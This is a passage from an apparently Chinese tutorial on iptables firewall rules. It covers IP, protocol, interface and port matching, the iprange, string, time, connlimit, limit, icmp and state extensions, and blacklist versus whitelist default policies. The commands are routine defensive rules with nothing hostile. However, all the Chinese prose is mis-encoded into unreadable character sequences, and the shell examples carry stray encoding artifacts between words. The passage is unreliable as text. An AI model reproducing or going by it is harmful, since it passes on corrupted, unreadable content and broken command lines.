å–åååˆ™è¡¨ç¤ºï¼ŒæŠ¥æ–‡æºåœ°å€IPåªè¦ä¸ä¸º1.1.1.6å³æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆï¼Œä¸Šä¾‹ä¸­è§„åˆ™è¡¨è¾¾çš„æ„æ€å°±æ˜¯ï¼Œåªè¦å‘å¾€æœ¬æœºçš„æŠ¥æ–‡çš„æºåœ°å€ä¸æ˜¯1.1.1.6ï¼Œå°±æ¥å—æŠ¥æ–‡ã€‚\n\nåªè¦æŠ¥æ–‡çš„æºIPä¸æ˜¯1.1.1.6ï¼Œé‚£ä¹ˆå°±æ¥å—æ­¤æŠ¥æ–‡ï¼Œä½†æ˜¯ï¼ŒæŸäº›å°ä¼™ä¼´å¯èƒ½ä¼šè¯¯ä¼šï¼ŒæŠŠä¸Šä¾‹ä¸­çš„è§„åˆ™ç†è§£æˆå¦‚ä¸‹å«ä¹‰ï¼Œ\n\nåªè¦æŠ¥æ–‡çš„æºIPæ˜¯1.1.1.6ï¼Œé‚£ä¹ˆå°±ä¸æ¥å—æ­¤æŠ¥æ–‡ï¼Œè¿™ç§ç†è§£ä¸ä¸Šè¿°ç†è§£çœ‹ä¼¼å·®åˆ«ä¸å¤§ï¼Œå…¶å®å®Œå…¨ä¸ä¸€æ ·ï¼Œè¿™æ ·ç†è§£æ˜¯é”™è¯¯çš„ï¼Œä¸Šè¿°ç†è§£æ‰æ˜¯æ­£ç¡®çš„ã€‚\n\n> æ¢å¥è¯è¯´å°±æ˜¯ï¼ŒæŠ¥æ–‡çš„æºIPä¸æ˜¯1.1.1.6æ—¶ï¼Œä¼šè¢«æ¥æ”¶ï¼Œå¹¶ä¸èƒ½ä»£è¡¨ï¼ŒæŠ¥æ–‡çš„æºIPæ˜¯1.1.1.6æ—¶ï¼Œä¼šè¢«æ‹’ç»ã€‚\n\n\n\n### 4.2 åŒ¹é…IPåœ°å€\n\n```bash\n# åªä¸¢å¼ƒä» 1.1.1.7 å‘å¾€ 1.1.1.8 è¿™ä¸ªIPçš„æŠ¥æ–‡\niptables -I INPUT -s 1.1.1.7 -d 1.1.1.8 -j DROP\n```\n\nå¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šä»»ä½•ç›®æ ‡åœ°å€ï¼Œåˆ™ç›®æ ‡åœ°å€é»˜è®¤ä¸º0.0.0.0/0ï¼ŒåŒç†ï¼Œå¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šæºåœ°å€ï¼Œæºåœ°å€é»˜è®¤ä¸º0.0.0.0/0ï¼Œ0.0.0.0/0è¡¨ç¤ºæ‰€æœ‰IPï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\nä¸-sé€‰é¡¹ä¸€æ ·ï¼Œ-dé€‰é¡¹ä¹Ÿå¯ä»¥ä½¿ç”¨\"å¹å·\"è¿›è¡Œå–åï¼Œä¹Ÿèƒ½å¤ŸåŒæ—¶æŒ‡å®šå¤šä¸ªIPåœ°å€ï¼Œä½¿ç”¨\"é€—å·\"éš”å¼€å³å¯ã€‚\n\nä½†æ˜¯è¯·æ³¨æ„ï¼Œä¸ç®¡æ˜¯-sé€‰é¡¹è¿˜æ˜¯-dé€‰é¡¹ï¼Œå–åæ“ä½œä¸åŒæ—¶æŒ‡å®šå¤šä¸ªIPçš„æ“ä½œä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚\n\n\n\n> éœ€è¦æ˜ç¡®çš„ä¸€ç‚¹å°±æ˜¯ï¼šå½“ä¸€æ¡è§„åˆ™ä¸­æœ‰å¤šä¸ªåŒ¹é…æ¡ä»¶æ—¶ï¼Œè¿™å¤šä¸ªåŒ¹é…æ¡ä»¶ä¹‹é—´ï¼Œé»˜è®¤å­˜åœ¨\"ä¸\"çš„å…³ç³»ã€‚ä¹Ÿå°±æ˜¯å–å…¶äº¤é›†çš„æ„æ€ã€‚\n\n\n\n### 4.3 åŒ¹é…åè®®ç±»å‹\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨-pé€‰é¡¹ï¼ŒæŒ‡å®šéœ€è¦åŒ¹é…çš„æŠ¥æ–‡çš„åè®®ç±»å‹ã€‚\n\næ‹’ç»æ¥è‡ª `1.1.1.2`çš„tcpç±»å‹çš„è¯·æ±‚\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -j DROP\n\n\nroot@tencent:~# iptables -L INPUT\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\nDROP       tcp  --  1.1.1.2              anywhere\n```\n\n\n\ncentos6ä¸­ï¼Œ-pé€‰é¡¹æ”¯æŒå¦‚ä¸‹åè®®ç±»å‹\n\n```bash\ntcp, udp, udplite, icmp, esp, ah, sctp\n```\n\ncentos7ä¸­ï¼Œ-pé€‰é¡¹æ”¯æŒå¦‚ä¸‹åè®®ç±»å‹\n\n```bash\ntcp, udp, udplite, icmp, icmpv6,esp, ah, sctp, mh\n```\n\nå½“ä¸ä½¿ç”¨-pæŒ‡å®šåè®®ç±»å‹æ—¶ï¼Œé»˜è®¤è¡¨ç¤ºæ‰€æœ‰ç±»å‹çš„åè®®éƒ½ä¼šè¢«åŒ¹é…åˆ°ï¼Œä¸ä½¿ç”¨-p allçš„æ•ˆæœç›¸åŒã€‚\n\n\n\n+ æµ‹è¯•\n\n  ```bash\n  ping 49.234.15.70 # æœåŠ¡å™¨å¯ä»¥é€š\n  \n  ps -ef | grep sshd #  è·å–ç™»å½•è€… root@pts/1\n  who -a | grep pts/0 # è·å–ç™»å½•è€…ip 20816 (223.70.253.1)\n  \n  iptables -I INPUT -s 223.70.253.1 -p icmp -j DROP # æœåŠ¡å™¨ç¦ping\n  \n  ping 49.234.15.70 # æœåŠ¡å™¨ä¸é€šäº†\n  ```\n\n\n\n### 4.4 åŒ¹é…ç½‘å¡æ¥å£\n\n+ å…¥å£\n\nä½¿ç”¨-ié€‰é¡¹ï¼ŒæŒ‡å®šç½‘å¡åç§°, è¡¨ç¤ºä¸¢å¼ƒç”±eth0ç½‘å¡æµå…¥çš„icmpç±»å‹çš„æŠ¥æ–‡ã€‚\n\n```bash\niptables -I INPUT -s 223.70.253.1 -i eth0 -p icmp -j DROP\n```\n\n\n\n-ié€‰é¡¹æ˜¯ç”¨äºåŒ¹é…æŠ¥æ–‡æµå…¥çš„ç½‘å¡çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä»æœ¬æœºå‘å‡ºçš„æŠ¥æ–‡æ˜¯ä¸å¯èƒ½ä¼šä½¿ç”¨åˆ°-ié€‰é¡¹çš„ï¼Œå› ä¸ºè¿™äº›ç”±æœ¬æœºå‘å‡ºçš„æŠ¥æ–‡å‹æ ¹ä¸æ˜¯ä»ç½‘å¡æµå…¥çš„ï¼Œè€Œæ˜¯è¦é€šè¿‡ç½‘å¡å‘å‡ºçš„ï¼Œä»è¿™ä¸ªè§’åº¦è€ƒè™‘ï¼Œ-ié€‰é¡¹çš„ä½¿ç”¨æ˜¯æœ‰é™åˆ¶çš„ã€‚\n\næ‰€ä»¥-ié€‰é¡¹åªèƒ½ç”¨äºä¸Šå›¾ä¸­çš„PREROUTINGé“¾ã€INPUTé“¾ã€FORWARDé“¾ï¼Œè¿™æ˜¯-ié€‰é¡¹çš„ç‰¹æ®Šæ€§ã€‚\n\n\n\n+ å‡ºå£\n\nå½“ä¸»æœºæœ‰å¤šå—ç½‘å¡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨-oé€‰é¡¹ï¼ŒåŒ¹é…æŠ¥æ–‡å°†ç”±å“ªå—ç½‘å¡æµå‡ºï¼Œæ²¡é”™ï¼Œ-oé€‰é¡¹ä¸-ié€‰é¡¹æ˜¯ç›¸å¯¹çš„ï¼Œ-ié€‰é¡¹ç”¨äºåŒ¹é…æŠ¥æ–‡ä»å“ªä¸ªç½‘å¡æµå…¥ï¼Œ-oé€‰é¡¹ç”¨äºåŒ¹é…æŠ¥æ–‡å°†ä»å“ªä¸ªç½‘å¡æµå‡ºã€‚\n\n-oé€‰é¡¹åªèƒ½ç”¨äºFORWARDé“¾ã€OUTPUTé“¾ã€POSTROUTINGé“¾ã€‚\n\n\n\n### 4.5 åŒ¹é…ç«¯å£\n\nåŒ¹é…ç«¯å£å±äºæ‰©å±•åŒ¹é…æ¡ä»¶, éœ€è¦ä¾èµ–ä¸€äº›æ‰©å±•æ¨¡å—.\n\n##### 4.5.1 ç«¯å£ -m tcp\n\né€‰é¡¹--dportå¯ä»¥åŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ï¼Œ--dportæ„ä¸ºdestination-portï¼Œå³è¡¨ç¤ºç›®æ ‡ç«¯å£ã€‚ä¸ä¹‹å‰çš„é€‰é¡¹ä¸åŒï¼Œ--dportå‰æœ‰ä¸¤æ¡\"æ¨ªæ \"ï¼Œè€Œä¸”ï¼Œä½¿ç”¨--dporté€‰é¡¹æ—¶ï¼Œå¿…é¡»äº‹å…ˆæŒ‡å®šäº†ä½¿ç”¨å“ªç§åè®®ï¼Œå³å¿…é¡»å…ˆä½¿ç”¨-pé€‰é¡¹\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -m tcp --dport 22 -j DROP\n\n\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 1631 packets, 1525K bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DROP       tcp  --  *      *       1.1.1.2              0.0.0.0/0            tcp dpt:22\n```\n\n\n\nåœ¨ä½¿ç”¨--dportä¹‹å‰ï¼Œæˆ‘ä»¬ä½¿ç”¨-mé€‰é¡¹ï¼ŒæŒ‡å®šäº†å¯¹åº”çš„æ‰©å±•æ¨¡å—ä¸ºtcpï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨--dportè¿™ä¸ªæ‰©å±•åŒ¹é…æ¡ä»¶ï¼Œåˆ™å¿…é¡»ä¾é æŸä¸ªæ‰©å±•æ¨¡å—å®Œæˆï¼Œä¸Šä¾‹ä¸­ï¼Œè¿™ä¸ªæ‰©å±•æ¨¡å—å°±æ˜¯tcpæ‰©å±•æ¨¡å—ï¼Œæœ€ç»ˆï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯tcpæ‰©å±•æ¨¡å—ä¸­çš„dportæ‰©å±•åŒ¹é…æ¡ä»¶ã€‚\n\n+ -m tcpè¡¨ç¤ºä½¿ç”¨tcpæ‰©å±•æ¨¡å—ï¼Œ--dportè¡¨ç¤ºtcpæ‰©å±•æ¨¡å—ä¸­çš„ä¸€ä¸ªæ‰©å±•åŒ¹é…æ¡ä»¶ï¼Œå¯ç”¨äºåŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ã€‚\n+ -p tcpä¸ -m tcpå¹¶ä¸å†²çªï¼Œ-pç”¨äºåŒ¹é…æŠ¥æ–‡çš„åè®®ï¼Œ-m ç”¨äºæŒ‡å®šæ‰©å±•æ¨¡å—çš„åç§°ï¼Œæ­£å¥½ï¼Œè¿™ä¸ªæ‰©å±•æ¨¡å—ä¹Ÿå«tcpã€‚\n\n\n\næ‰©å±•åŒ¹é…æ¡ä»¶æ˜¯å¯ä»¥å–åçš„ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨\"!\"è¿›è¡Œå–åï¼Œæ¯”å¦‚ \"! --dport 22\"ï¼Œè¡¨ç¤ºç›®æ ‡ç«¯å£ä¸æ˜¯22çš„æŠ¥æ–‡å°†ä¼šè¢«åŒ¹é…åˆ°ã€‚\n\nä»£è¡¨\"æºç«¯å£\"çš„æ‰©å±•åŒ¹é…æ¡ä»¶ä¸º--sport, ä¸ç®¡æ˜¯--sportè¿˜æ˜¯--dsportï¼Œéƒ½èƒ½å¤ŸæŒ‡å®šä¸€ä¸ªç«¯å£èŒƒå›´ï¼Œæ¯”å¦‚ï¼Œ--dport 22:25è¡¨ç¤ºç›®æ ‡ç«¯å£ä¸º22åˆ°25ä¹‹é—´çš„æ‰€æœ‰ç«¯å£ï¼Œå³22ç«¯å£ã€23ç«¯å£ã€24ç«¯å£ã€25ç«¯å£\n\n\n\n##### 4.5.1 å¤šä¸ªç«¯å£ -m multiport\n\nå¦‚æœæƒ³è¦åŒæ—¶æŒ‡å®šå¤šä¸ªç¦»æ•£çš„ç«¯å£ï¼Œéœ€è¦å€ŸåŠ©å¦ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œ\"multiport\"æ¨¡å—ã€‚\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -m multiport --dports 22,36,80 -j DROP\n\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 184 packets, 109K bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DROP       tcp  --  *      *       1.1.1.2              0.0.0.0/0            multiport dports 22,36,80\n```\n\n\n\n# 5. å¸¸ç”¨æ‰©å±•\n\n### 5.1 iprangeæ‰©å±•æ¨¡å—\n\nä½¿ç”¨iprangeæ‰©å±•æ¨¡å—å¯ä»¥æŒ‡å®š\"ä¸€æ®µè¿ç»­çš„IPåœ°å€èŒƒå›´\"ï¼Œç”¨äºåŒ¹é…æŠ¥æ–‡çš„æºåœ°å€æˆ–è€…ç›®æ ‡åœ°å€ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -mÂ iprangeÂ --src-rangeÂ 192.168.1.127-192.168.1.146Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -mÂ iprangeÂ --dst-rangeÂ 192.168.1.127-192.168.1.146Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -mÂ iprangeÂ !Â --src-rangeÂ 192.168.1.127-192.168.1.146Â -jÂ DROP\n```\n\n\n\n### 5.2 stringæ‰©å±•æ¨¡å—\n\nä½¿ç”¨stringæ‰©å±•æ¨¡å—ï¼Œå¯ä»¥æŒ‡å®šè¦åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæŠ¥æ–‡ä¸­åŒ…å«å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œåˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚\n\n--algoï¼šç”¨äºæŒ‡å®šåŒ¹é…ç®—æ³•ï¼Œå¯é€‰çš„ç®—æ³•æœ‰bmä¸kmpï¼Œæ­¤é€‰é¡¹ä¸ºå¿…é¡»é€‰é¡¹ï¼Œæˆ‘ä»¬ä¸ç”¨çº ç»“äºé€‰æ‹©å“ªä¸ªç®—æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬å¿…é¡»æŒ‡å®šä¸€ä¸ªã€‚\n\n--stringï¼šç”¨äºæŒ‡å®šéœ€è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ --sportÂ 80Â -mÂ stringÂ --algoÂ bmÂ --stringÂ \"OOXX\"Â -jÂ REJECT\n```\n\n\n\n### 5.3 timeæ‰©å±•æ¨¡å—\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡timeæ‰©å±•æ¨¡å—ï¼Œæ ¹æ®æ—¶é—´æ®µåŒºåŒ¹é…æŠ¥æ–‡ï¼Œå¦‚æœæŠ¥æ–‡åˆ°è¾¾çš„æ—¶é—´åœ¨æŒ‡å®šçš„æ—¶é—´èŒƒå›´ä»¥å†…ï¼Œåˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚\n\n--timestartï¼šç”¨äºæŒ‡å®šæ—¶é—´èŒƒå›´çš„å¼€å§‹æ—¶é—´ï¼Œä¸å¯å–å\n\n--timestopï¼šç”¨äºæŒ‡å®šæ—¶é—´èŒƒå›´çš„ç»“æŸæ—¶é—´ï¼Œä¸å¯å–å\n\n--weekdaysï¼šç”¨äºæŒ‡å®š\"æ˜ŸæœŸå‡ \"ï¼Œå¯å–å\n\n--monthdaysï¼šç”¨äºæŒ‡å®š\"å‡ å·\"ï¼Œå¯å–å\n\n--datestartï¼šç”¨äºæŒ‡å®šæ—¥æœŸèŒƒå›´çš„å¼€å§‹æ—¥æœŸï¼Œä¸å¯å–å\n\n--datestopï¼šç”¨äºæŒ‡å®šæ—¥æœŸèŒƒå›´çš„ç»“æŸæ—¶é—´ï¼Œä¸å¯å–å\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â -mÂ timeÂ --timestartÂ 09:00:00Â --timestopÂ 19:00:00Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 443Â -mÂ timeÂ --timestartÂ 09:00:00Â --timestopÂ 19:00:00Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --weekdaysÂ 6,7Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --monthdaysÂ 22,23Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ !Â --monthdaysÂ 22,23Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --timestartÂ 09:00:00Â --timestopÂ 18:00:00Â --weekdaysÂ 6,7Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --weekdaysÂ 5Â --monthdaysÂ 22,23,24,25,26,27,28Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --datestartÂ 2017-12-24Â --datestopÂ 2017-12-27Â -jÂ REJECT\n```\n\n\n\n### 5.4 connlimitæ‰©å±•æ¨¡å—\n\nä½¿ç”¨connlimitæ‰©å±•æ¨¡å—ï¼Œå¯ä»¥é™åˆ¶æ¯ä¸ªIPåœ°å€åŒæ—¶é“¾æ¥åˆ°serverç«¯çš„é“¾æ¥æ•°é‡ï¼Œæ³¨æ„ï¼šæˆ‘ä»¬ä¸ç”¨æŒ‡å®šIPï¼Œå…¶é»˜è®¤å°±æ˜¯é’ˆå¯¹\"æ¯ä¸ªå®¢æˆ·ç«¯IP\"ï¼Œå³å¯¹å•IPçš„å¹¶å‘è¿æ¥æ•°é™åˆ¶ã€‚\n\n--connlimit-aboveï¼šå•ç‹¬ä½¿ç”¨æ­¤é€‰é¡¹æ—¶ï¼Œè¡¨ç¤ºé™åˆ¶æ¯ä¸ªIPçš„é“¾æ¥æ•°é‡ã€‚\n\n--connlimit-maskï¼šæ­¤é€‰é¡¹ä¸èƒ½å•ç‹¬ä½¿ç”¨ï¼Œåœ¨ä½¿ç”¨--connlimit-aboveé€‰é¡¹æ—¶ï¼Œé…åˆæ­¤é€‰é¡¹ï¼Œåˆ™å¯ä»¥é’ˆå¯¹\"æŸç±»IPæ®µå†…çš„ä¸€å®šæ•°é‡çš„IP\"è¿›è¡Œè¿æ¥æ•°é‡çš„é™åˆ¶\n\n```bash\niptablesÂ -IÂ INPUTÂ -pÂ tcpÂ --dportÂ 22Â -mÂ connlimitÂ --connlimit-aboveÂ 2Â -jÂ REJECT\niptablesÂ -IÂ INPUTÂ -pÂ tcpÂ --dportÂ 22Â -mÂ connlimitÂ --connlimit-aboveÂ 20Â --connlimit-maskÂ 24Â -jÂ REJECT\niptablesÂ -IÂ INPUTÂ -pÂ tcpÂ --dportÂ 22Â -mÂ connlimitÂ --connlimit-aboveÂ 10Â --connlimit-maskÂ 27Â -jÂ REJECT\n```\n\n\n\n### 5.5 limitæ‰©å±•æ¨¡å—\n\nlimitæ¨¡å—æ˜¯å¯¹\"æŠ¥æ–‡åˆ°è¾¾é€Ÿç‡\"è¿›è¡Œé™åˆ¶çš„ã€‚å¦‚æœæˆ‘æƒ³è¦é™åˆ¶å•ä½æ—¶é—´å†…æµå…¥çš„åŒ…çš„æ•°é‡ï¼Œå°±èƒ½ç”¨limitæ¨¡å—ã€‚\n\n--limit-burstï¼šç±»æ¯”\"ä»¤ç‰Œæ¡¶\"ç®—æ³•ï¼Œæ­¤é€‰é¡¹ç”¨äºæŒ‡å®šä»¤ç‰Œæ¡¶ä¸­ä»¤ç‰Œçš„æœ€å¤§æ•°é‡ã€‚\n\n--limitï¼šç±»æ¯”\"ä»¤ç‰Œæ¡¶\"ç®—æ³•ï¼Œæ­¤é€‰é¡¹ç”¨äºæŒ‡å®šä»¤ç‰Œæ¡¶ä¸­ç”Ÿæˆæ–°ä»¤ç‰Œçš„é¢‘ç‡ï¼Œå¯ç”¨æ—¶é—´å•ä½æœ‰secondã€minute ã€hourã€dayã€‚\n\n```bash\n#å¦‚ä¸‹ä¸¤æ¡è§„åˆ™éœ€é…åˆä½¿ç”¨\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ -mÂ limitÂ --limit-burstÂ 3Â --limitÂ 10/minuteÂ -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -AÂ INPUTÂ -pÂ icmpÂ -jÂ REJECT\n```\n\n\n\n### 5.6 udpæ‰©å±•\n\nudpæ‰©å±•æ¨¡å—èƒ½ç”¨çš„åŒ¹é…æ¡ä»¶æ¯”è¾ƒå°‘ï¼Œåªæœ‰ä¸¤ä¸ªï¼Œå°±æ˜¯--sportä¸--dportï¼Œå³åŒ¹é…æŠ¥æ–‡çš„æºç«¯å£ä¸ç›®æ ‡ç«¯å£ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ udpÂ -mÂ udpÂ --dportÂ 137Â -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ udpÂ -mÂ udpÂ --dportÂ 137:157Â -jÂ ACCEPT\n#å¯ä»¥ç»“åˆmultiportæ¨¡å—æŒ‡å®šå¤šä¸ªç¦»æ•£çš„ç«¯å£\n```\n\n\n\n### 5.7 icmpæ‰©å±•\n\nICMPåè®®çš„å…¨ç§°ä¸ºInternet Control Message Protocolï¼Œç¿»è¯‘ä¸ºäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼Œå®ƒä¸»è¦ç”¨äºæ¢æµ‹ç½‘ç»œä¸Šçš„ä¸»æœºæ˜¯å¦å¯ç”¨ï¼Œç›®æ ‡æ˜¯å¦å¯è¾¾ï¼Œç½‘ç»œæ˜¯å¦é€šç•…ï¼Œè·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ã€‚\n\npingå‘½ä»¤ä½¿ç”¨çš„å°±æ˜¯icmpåè®®ã€‚\n\n--icmp-typeï¼šåŒ¹é…icmpæŠ¥æ–‡çš„å…·ä½“ç±»å‹\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ -mÂ icmpÂ --icmp-typeÂ 8/0Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ --icmp-typeÂ 8Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ -mÂ icmpÂ --icmp-typeÂ 0/0Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ --icmp-typeÂ 0Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ --icmp-typeÂ \"echo-request\"Â -jÂ REJECT\n```\n\n\n\n### 5.8 stateæ‰©å±•\n\næˆ‘ä»¬ä¸ºäº†è®©\"æä¾›æœåŠ¡æ–¹\"èƒ½å¤Ÿæ­£å¸¸çš„\"å“åº”\"æˆ‘ä»¬çš„è¯·æ±‚ï¼Œäºæ˜¯åœ¨ä¸»æœºä¸Šå¼€æ”¾äº†å¯¹åº”çš„ç«¯å£(80, 22)ï¼Œå¼€æ”¾è¿™äº›ç«¯å£çš„åŒæ—¶ï¼Œä¹Ÿå‡ºç°äº†é—®é¢˜ï¼Œåˆ«äººåˆ©ç”¨è¿™äº›å¼€æ”¾çš„ç«¯å£ï¼Œ\"ä¸»åŠ¨\"çš„æ”»å‡»æˆ‘ä»¬ï¼Œä»–ä»¬å‘é€è¿‡æ¥çš„æŠ¥æ–‡å¹¶ä¸æ˜¯ä¸ºäº†å“åº”æˆ‘ä»¬ï¼Œè€Œæ˜¯ä¸ºäº†ä¸»åŠ¨æ”»å‡»æˆ‘ä»¬ã€‚\n\nå¯¹äºstateæ¨¡å—çš„è¿æ¥è€Œè¨€ï¼Œ\"è¿æ¥\"å…¶ä¸­çš„æŠ¥æ–‡å¯ä»¥åˆ†ä¸º5ç§çŠ¶æ€ï¼ŒæŠ¥æ–‡çŠ¶æ€å¯ä»¥ä¸ºNEWã€ESTABLISHEDã€RELATEDã€INVALIDã€UNTRACKEDã€‚\n\n\n\n+ æ€æ ·åˆ¤æ–­æŠ¥æ–‡æ˜¯å¦æ˜¯ä¸ºäº†å›åº”ä¹‹å‰å‘å‡ºçš„æŠ¥æ–‡?\n\næˆ‘ä»¬åªè¦æ”¾è¡ŒçŠ¶æ€ä¸ºESTABLISHEDçš„æŠ¥æ–‡å³å¯ï¼Œå› ä¸ºå¦‚æœæŠ¥æ–‡çš„çŠ¶æ€ä¸ºESTABLISHEDï¼Œé‚£ä¹ˆæŠ¥æ–‡è‚¯å®šæ˜¯ä¹‹å‰å‘å‡ºçš„æŠ¥æ–‡çš„å›åº”ï¼Œå¦‚æœä½ è¿˜ä¸æ”¾å¿ƒï¼Œå¯ä»¥å°†çŠ¶æ€ä¸ºRELATEDæˆ–ESTABLISHEDçš„æŠ¥æ–‡éƒ½æ”¾è¡Œï¼Œè¿™æ ·ï¼Œå°±è¡¨ç¤ºåªæœ‰å›åº”æˆ‘ä»¬çš„æŠ¥æ–‡èƒ½å¤Ÿé€šè¿‡é˜²ç«å¢™ï¼Œå¦‚æœæ˜¯åˆ«äººä¸»åŠ¨å‘é€è¿‡æ¥çš„æ–°çš„æŠ¥æ–‡ï¼Œåˆ™æ— æ³•é€šè¿‡é˜²ç«å¢™ã€‚\n\n\n\n# 6. é»‘ç™½åå•\n\nå½“é“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºACCEPTæ—¶ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­æ²¡æœ‰é…ç½®ä»»ä½•è§„åˆ™ï¼Œå°±è¡¨ç¤ºæ¥å—æ‰€æœ‰çš„æŠ¥æ–‡ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­å­˜åœ¨è§„åˆ™ï¼Œä½†æ˜¯è¿™äº›è§„åˆ™æ²¡æœ‰åŒ¹é…åˆ°æŠ¥æ–‡ï¼ŒæŠ¥æ–‡è¿˜æ˜¯ä¼šè¢«æ¥å—ã€‚\n\né“¾çš„é»˜è®¤ç­–ç•¥ä¸ºACCEPTæ—¶ï¼Œé“¾ä¸­çš„è§„åˆ™å¯¹åº”çš„åŠ¨ä½œåº”è¯¥ä¸ºDROPæˆ–è€…REJECTï¼Œè¡¨ç¤ºåªæœ‰åŒ¹é…åˆ°è§„åˆ™çš„æŠ¥æ–‡æ‰ä¼šè¢«æ‹’ç»ï¼Œæ²¡æœ‰è¢«è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡éƒ½ä¼šè¢«é»˜è®¤æ¥å—ï¼Œè¿™å°±æ˜¯\"é»‘åå•\"æœºåˆ¶ã€‚\n\n\n\nå½“é“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºDROPæ—¶ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­æ²¡æœ‰é…ç½®ä»»ä½•è§„åˆ™ï¼Œå°±è¡¨ç¤ºæ‹’ç»æ‰€æœ‰æŠ¥æ–‡ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­å­˜åœ¨è§„åˆ™ï¼Œä½†æ˜¯è¿™äº›è§„åˆ™æ²¡æœ‰åŒ¹é…åˆ°æŠ¥æ–‡ï¼ŒæŠ¥æ–‡è¿˜æ˜¯ä¼šè¢«æ‹’ç»ã€‚\n\nå½“é“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºDROPæ—¶ï¼Œé“¾ä¸­çš„è§„åˆ™å¯¹åº”çš„åŠ¨ä½œåº”è¯¥ä¸ºACCEPTï¼Œè¡¨ç¤ºåªæœ‰åŒ¹é…åˆ°è§„åˆ™çš„æŠ¥æ–‡æ‰ä¼šè¢«æ”¾è¡Œï¼Œæ²¡æœ‰è¢«è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡éƒ½ä¼šè¢«é»˜è®¤æ‹’ç»ï¼Œè¿™å°±æ˜¯\"ç™½åå•\"æœºåˆ¶ã€‚\n\n### 6.1 é»˜è®¤DROPçš„é—®é¢˜\n\nåœ¨å¯¹åº”çš„é“¾ä¸­æ²¡æœ‰è®¾ç½®ä»»ä½•è§„åˆ™æ—¶ï¼Œè¿™æ ·ä½¿ç”¨é»˜è®¤ç­–ç•¥ä¸ºDROPæ˜¯éå¸¸ä¸æ˜æ™ºçš„ï¼Œå› ä¸ºç®¡ç†å‘˜ä¹Ÿä¼šæŠŠè‡ªå·±æ‹’ä¹‹é—¨å¤–ï¼Œå³ä½¿å¯¹åº”çš„é“¾ä¸­å­˜åœ¨æ”¾è¡Œè§„åˆ™ï¼Œå½“æˆ‘ä»¬ä¸å°å¿ƒä½¿ç”¨\"iptables 